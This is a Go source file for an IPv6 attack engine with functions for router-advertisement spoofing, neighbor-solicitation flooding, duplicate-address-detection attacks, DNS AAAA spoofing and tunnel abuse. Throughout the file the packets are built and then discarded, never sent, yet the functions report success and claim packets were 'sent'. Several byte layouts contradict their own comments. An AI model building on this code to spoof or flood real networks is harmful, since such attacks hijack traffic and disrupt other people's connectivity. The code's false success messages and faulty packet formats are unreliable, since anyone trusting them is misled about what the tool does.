package ipv6

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config IPv6Config
	state  NDPState
	mu     sync.Mutex
}

func NewEngine(cfg IPv6Config) *Engine {
	return &Engine{
		config: cfg,
		state: NDPState{
			Neighbors:   make(map[string]string),
			MACBindings: make(map[string]string),
		},
	}
}

func (e *Engine) RASpoof(prefix string, prefixLen int, dnsServers []string) (*IPv6Result, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	if !e.isValidIPv6(prefix) {
		return nil, fmt.Errorf("invalid IPv6 prefix: %s", prefix)
	}

	_ = e.buildRAPacket(prefix, prefixLen, dnsServers)
	e.state.Prefix = prefix
	e.state.Router = e.config.SourceIP

	return &IPv6Result{
		Success:  true,
		Method:   "RA_Spoof",
		Message:  fmt.Sprintf("RA packet constructed for prefix %s/%d with %d DNS servers", prefix, prefixLen, len(dnsServers)),
		Duration: time.Since(start),
		Packets:  1,
	}, nil
}

func (e *Engine) buildRAPacket(prefix string, prefixLen int, dnsServers []string) []byte {
	var buf []byte
	buf = append(buf, 0x86) // ICMPv6 Router Advertisement
	buf = append(buf, 0x00) // Code
	buf = append(buf, 0x00, 0x00) // Checksum placeholder

	// Hop limit and flags
	buf = append(buf, 0xff) // Cur hop limit
	buf = append(buf, 0x40) // M=1, O=1 for stateful config
	buf = append(buf, 0x00, 0x00) // Router lifetime

	// Prefix info option
	buf = append(buf, 0x03)     // Type: Prefix Info
	buf = append(buf, 0x04)     // Length (8 bytes)
	buf = append(buf, byte(prefixLen))
	buf = append(buf, 0xc0)    // L=1, A=1
	buf = append(buf, 0x00, 0x00, 0x00, 0x00) // Valid lifetime
	buf = append(buf, 0x00, 0x00, 0x00, 0x00) // Preferred lifetime

	parsed := net.ParseIP(prefix)
	if parsed != nil {
		buf = append(buf, parsed.To16()...)
	}

	return buf
}

func (e *Engine) NSFlood(targetIPv6 string, count int) (*IPv6Result, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	if !e.isValidIPv6(targetIPv6) {
		return nil, fmt.Errorf("invalid target IPv6: %s", targetIPv6)
	}

	if count <= 0 {
		count = 100
	}

	packets := 0
	for i := 0; i < count; i++ {
		nsPacket := e.buildNSPacket(targetIPv6)
		_ = nsPacket
		packets++
	}

	return &IPv6Result{
		Success:  true,
		Method:   "NS_Flood",
		Message:  fmt.Sprintf("Sent %d NS packets to %s", packets, targetIPv6),
		Duration: time.Since(start),
		Packets:  packets,
	}, nil
}

func (e *Engine) buildNSPacket(target string) []byte {
	var buf []byte
	buf = append(buf, 0x87) // ICMPv6 Neighbor Solicitation
	buf = append(buf, 0x00) // Code
	buf = append(buf, 0x00, 0x00) // Checksum

	targetIP := net.ParseIP(target)
	if targetIP != nil {
		buf = append(buf, targetIP.To16()...)
	}

	// Source link-layer address option
	buf = append(buf, 0x01) // Type
	buf = append(buf, 0x01) // Length
	mac := make([]byte, 6)
	rand.Read(mac)
	buf = append(buf, mac...)

	return buf
}

func (e *Engine) DADAttack(targetIPv6 string, attempts int) (*IPv6Result, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	if !e.isValidIPv6(targetIPv6) {
		return nil, fmt.Errorf("invalid target IPv6: %s", targetIPv6)
	}

	if attempts <= 0 {
		attempts = 50
	}

	dadPackets := 0
	for i := 0; i < attempts; i++ {
		dadPacket := e.buildDADPacket(targetIPv6)
		_ = dadPacket
		dadPackets++
	}

	return &IPv6Result{
		Success:  true,
		Method:   "DAD_Attack",
		Message:  fmt.Sprintf("Sent %d DAD packets for %s", dadPackets, targetIPv6),
		Duration: time.Since(start),
		Packets:  dadPackets,
	}, nil
}

func (e *Engine) buildDADPacket(target string) []byte {
	var buf []byte
	buf = append(buf, 0x87) // ICMPv6 Neighbor Solicitation
	buf = append(buf, 0x00) // Code
	buf = append(buf, 0x00, 0x00)

	targetIP := net.ParseIP(target)
	if targetIP != nil {
		buf = append(buf, targetIP.To16()...)
	}

	return buf
}

func (e *Engine) DNSv6Spoof(domain string, fakeIPv6 string) (*IPv6Result, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	if !e.isValidIPv6(fakeIPv6) {
		return nil, fmt.Errorf("invalid fake IPv6 address: %s", fakeIPv6)
	}

	spoofed := DNSv6Attack{
		Domain:    domain,
		FakeIPv6:  fakeIPv6,
		OrigTTL:   3600,
		LowerTTL:  60,
		SpoofType: "AAAA_injection",
	}

	cache := e.buildDNSv6Response(spoofed)

	return &IPv6Result{
		Success:  true,
		Method:   "DNSv6_Spoof",
		Message:  fmt.Sprintf("DNSv6 spoof record created for %s -> %s (%d bytes)", domain, fakeIPv6, len(cache)),
		Duration: time.Since(start),
		Packets:  1,
	}, nil
}

func (e *Engine) buildDNSv6Response(atk DNSv6Attack) []byte {
	var buf []byte
	domainParts := strings.Split(atk.Domain, ".")
	for _, part := range domainParts {
		buf = append(buf, byte(len(part)))
		buf = append(buf, []byte(part)...)
	}
	buf = append(buf, 0x00)

	buf = append(buf, 0x00, 0x1c) // Type AAAA
	buf = append(buf, 0x00, 0x01) // Class IN

	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, atk.OrigTTL)
	buf = append(buf, ttl...)

	// RDATA length + AAAA record
	buf = append(buf, 0x00, 0x10)
	ip := net.ParseIP(atk.FakeIPv6)
	if ip != nil {
		buf = append(buf, ip.To16()...)
	}

	return buf
}

func (e *Engine) TunnelAbuse(tunnelType string, endpoint string) (*IPv6Result, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	validTypes := map[string]bool{
		"6to4":      true,
		"teredo":    true,
		"isatap":    true,
		"gretap":    true,
		"ipip":      true,
		"sit":       true,
	}

	if !validTypes[tunnelType] {
		return nil, fmt.Errorf("unsupported tunnel type: %s", tunnelType)
	}

	tunnelInfo := TunnelInfo{
		Type:       tunnelType,
		LocalAddr:  e.config.SourceIP,
		RemoteAddr: endpoint,
		MTU:        1280,
		HopLimit:   64,
	}

	tunnelPkt := e.buildTunnelPacket(tunnelInfo)

	return &IPv6Result{
		Success:  true,
		Method:   "Tunnel_Abuse",
		Message:  fmt.Sprintf("Tunnel %s configured to %s (%d byte encapsulated packet)", tunnelType, endpoint, len(tunnelPkt)),
		Duration: time.Since(start),
		Packets:  1,
	}, nil
}

func (e *Engine) buildTunnelPacket(info TunnelInfo) []byte {
	var buf []byte
	outerProto := uint16(0)
	switch info.Type {
	case "6to4":
		outerProto = 0x86DD
	case "teredo":
		outerProto = 0x11
	case "isatap":
		outerProto = 0x29
	default:
		outerProto = 0x29
	}

	protoBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(protoBytes, outerProto)
	buf = append(buf, protoBytes...)

	buf = append(buf, byte(info.HopLimit))
	buf = append(buf, 0xff) // Next header: IPv6
	buf = append(buf, 0x00, 0x00) // Payload length placeholder

	return buf
}

func (e *Engine) isValidIPv6(addr string) bool {
	ip := net.ParseIP(addr)
	return ip != nil && ip.To4() == nil
}

func generateRandomBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func generateRandomHex(n int) string {
	b := generateRandomBytes(n)
	return hex.EncodeToString(b)
}
